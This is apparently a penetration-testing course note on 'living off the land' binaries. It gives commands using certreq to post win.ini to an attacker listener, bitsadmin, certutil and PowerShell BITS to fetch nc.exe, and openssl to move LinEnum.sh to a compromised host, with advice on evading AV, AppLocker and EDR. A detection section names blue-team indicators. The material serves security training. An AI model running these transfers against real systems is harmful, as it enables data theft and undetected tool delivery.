## 📌 What is “Living off the Land”?

The phrase **"Living off the land"** was coined by Christopher Campbell (@obscuresec) and Matt Graeber (@mattifestation) at DerbyCon 3.

It refers to:

> Using **legitimate built-in operating system binaries** to perform malicious or unauthorized actions.

These binaries are commonly referred to as:

### 🔹 LOLBins (Living Off The Land Binaries)

They allow attackers to perform actions **beyond their original intended purpose**, such as:

- Download
    
- Upload
    
- Command Execution
    
- File Read
    
- File Write
    
- Defense Bypass
    

---

# 🌐 Key Resources

## 🪟 Windows – LOLBAS Project

![Image](https://miro.medium.com/1%2A-Sd65LLhO2D-LJxQYwUg1w.png)

![Image](https://lolbas-project.github.io/assets/logo.png)

![Image](https://learn.microsoft.com/en-us/windows/win32/bits/images/bitsadmin.png)

![Image](https://labs.withsecure.com/adobe/dynamicmedia/deliver/dm-aid--31158540-f488-459a-ba6c-7fb9b2b33eea/bitsadmin-evtx.png?preferwebp=true&quality=82)

Website: **LOLBAS Project**

Searchable by:

- `/download`
    
- `/upload`
    
- `/execute`
    
- `/bypass`
    

---

## 🐧 Linux – GTFOBins

![Image](https://miro.medium.com/v2/resize%3Afit%3A1200/1%2AAkPosrFRUcS6-L2QivIepw.jpeg)

![Image](https://opengraph.githubassets.com/c6e630783d9c55f72e1e55d1466938470b1d259aebb2d2e1e69c620645d091ed/GTFOBins/GTFOBins.github.io/issues/121)

![Image](https://www.fortinet.com/content/dam/fortinet/images/cyberglossary/fig02-lotl-gtfobins.jpg)

![Image](https://miro.medium.com/v2/resize%3Afit%3A3696/1%2AQKZrZC7A74N-Ij9Oo7M-0g.png)

Website: **GTFOBins**

Search using:

- `+file download`
    
- `+file upload`
    

---

# 🪟 Windows Living off the Land Examples

---

## 1️⃣ CertReq.exe (Upload)

Used normally for certificate enrollment — but can POST files.

### Upload `win.ini` to attacker:

```cmd
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

Then catch it:

```bash
sudo nc -lvnp 8000
```

✔ File contents appear inside Netcat session.

⚠ If `-Post` not available → older version → use updated binary.

---

## 2️⃣ Bitsadmin (Download)

Background Intelligent Transfer Service (BITS).

> Designed to download files quietly while minimizing network impact.

### Download Example:

```powershell
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

---

## 3️⃣ PowerShell BITS Module

```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

Supports:

- Credentials
    
- Proxy
    
- Upload
    
- Download
    

---

## 4️⃣ Certutil (Defacto Windows wget)

Discovered by Casey Smith (@subTee).

```cmd
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

⚠ Important:

- Available on almost all Windows versions
    
- Frequently detected by AMSI
    
- Commonly flagged by EDR
    

---

# 🐧 Linux Living off the Land Examples

---

## OpenSSL – “nc style” Transfer

OpenSSL is frequently installed and often included in other software distributions.

Used normally for:

- Certificates
    
- Encryption
    
- TLS
    

But can be used for file transfer.

---

## 🔐 Step 1: Create Certificate (Attacker)

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

---

## 🖥 Step 2: Start Server

```bash
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

---

## 💻 Step 3: Download from Compromised Machine

```bash
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

✔ File transferred over TLS  
✔ No Netcat required  
✔ Encrypted channel

---

# 🔥 Why LOTL is Powerful

|Advantage|Explanation|
|---|---|
|No custom malware|Uses trusted OS binaries|
|Harder to block|Admin tools are required for business|
|Blends in|Traffic appears legitimate|
|Bypasses AppLocker|If binary is whitelisted|
|Less suspicious|No dropped tools|

---

# 🧠 Detection Considerations

Blue Teams look for:

- Certutil downloading executables
    
- Bitsadmin used interactively
    
- Certreq posting unusual content
    
- OpenSSL s_server listening unexpectedly
    
- Abnormal command-line arguments
    

MITRE ATT&CK Techniques often associated:

- T1105 (Ingress Tool Transfer)
    
- T1218 (Signed Binary Proxy Execution)
    

---

# ⚠ Important Notes (Keep as-is)

✔ The more obscure the binary, the better.  
✔ You never know when you'll need one of these binaries during an assessment.  
✔ It'll save time if you already have detailed notes on multiple options.  
✔ Some of the binaries that can be leveraged for file transfers may surprise you.

---

# 🏁 Quick Comparison Table

|OS|Tool|Function|Stealth Level|Encryption|
|---|---|---|---|---|
|Windows|certreq|Upload|Medium|No|
|Windows|bitsadmin|Download|High|HTTP|
|Windows|certutil|Download|Low (detected often)|HTTP|
|Linux|openssl|Upload/Download|High|Yes|
|Both|Built-in HTTP tools|Download|Medium|Optional|

---

# 🧠 When to Use LOTL

Use LOTL when:

- AV blocks dropped binaries
    
- AppLocker is enabled
    
- EDR blocks Netcat
    
- SMB/FTP is blocked
    
- You need stealth
    
- You want to blend into admin traffic
    

---

# 🎯 Practical Advice

- Bookmark LOLBAS & GTFOBins
    
- Test 5+ methods in lab
    
- Document obscure methods
    
- Practice muscle memory
    
- Know 3+ alternatives per function
---
